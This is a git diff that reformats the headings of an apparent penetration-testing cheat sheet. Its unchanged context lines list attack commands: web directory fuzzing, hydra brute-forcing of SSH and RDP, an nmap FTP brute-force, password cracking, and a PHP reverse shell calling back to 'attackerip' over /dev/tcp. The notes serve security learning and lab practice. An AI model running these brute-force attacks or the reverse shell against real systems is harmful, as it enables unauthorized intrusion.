@@ -20,10 +20,10 @@
 - [16. Privilege escalation](/Privilege.md)
 - [17. Simple Local Web Servers](#localweb)
 
-- # 7. Cewl <a name="cewl"></a>
+# 7. Cewl <a name="cewl"></a>
 - ```cewl -w passwords.txt http://192.168.245.48:1898/?q=node/1```
 
-- # 3. Gobuster <a name="gobuster"></a>
+# 3. Gobuster <a name="gobuster"></a>
 ```
 gobuster dir -u <url> -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 ```
@@ -36,7 +36,7 @@ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://192.168.54.84 -t 100
 ```  
 
 
-- # 4. FFUF <a name="ffuf"></a>
+# 4. FFUF <a name="ffuf"></a>
 - FFUF is used to filter the invalid pages 
 - ```ffuf -u <url>/FUZZ -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt```
 - ```ffuf -u <url>/FUZZ -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -r -fs 27200```
@@ -45,19 +45,19 @@ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://192.168.54.84 -t 100
 ffuf -u http://test.com -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H ‘Host: FUZZ.test.com’ -fs 0 -fs 65
 ```
 
-- # 5. Nikto <a name="nikto"></a>
+# 5. Nikto <a name="nikto"></a>
 - ```nikto -h http://127.0.0.1```
 
 
 
 
-- # 6. Mysql <a name="mysql"></a>
+# 6. Mysql <a name="mysql"></a>
 - ```mysql -u root -p -h $ip```
 
 
 
 
-- # 8. Hydra <a name="hydra"></a>
+# 8. Hydra <a name="hydra"></a>
 - `hydra -C <combinations.txt> <ip> <service>`
 - ```hydra -l <username> -P /usr/share/wordlists/rockyou.txt <ipaddress> ssh -t 50```
 - ```hydra -L users.txt -P passwords.txt ssh://192.168.245.48 -t 4 > hydra.txt```
@@ -93,7 +93,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh
 
 
 
-- # 10. FTP <a name="ftp"></a>
+# 10. FTP <a name="ftp"></a>
 ```
 nmap -Pn -A -p 21 -T4 --script=ftp-brute.nse --script-args userdb=/root/usr 10.0.1.22  -o namp
 ```
@@ -106,7 +106,7 @@ nmap -Pn -A -p 21 -T4 --script=ftp-brute.nse --script-args userdb=/root/usr 10.0
 
 
 
-- # 14. netcat <a name="nc"></a>
+# 14. netcat <a name="nc"></a>
 ```php
 <?php
  exec("/bin/bash -c 'bash -i >& /dev/tcp/attackerip/553 0>&1'");
@@ -128,7 +128,7 @@ __Download the reverse shell in windows__
 
 
 
-- # 12. RDP-3389 <a name="rdp"></a>
+# 12. RDP-3389 <a name="rdp"></a>
 
 - `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /user/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<target ip> -s <target port>`
 
@@ -149,7 +149,7 @@ exploit
 - __`xfreerdp /u:administrator /p:password123 /v:<targetip>`__
 
 
-- # 11. Password Cracking <a name="cracking"></a>
+# 11. Password Cracking <a name="cracking"></a>
 ### John The Ripper
 ```
 john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt
@@ -158,7 +158,7 @@ john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt
 
 
 
-- # 17. Simple Local Web Servers <a name="localweb"></a>
+# 17. Simple Local Web Servers <a name="localweb"></a>
 
 ```
 python -m SimpleHTTPServer 80
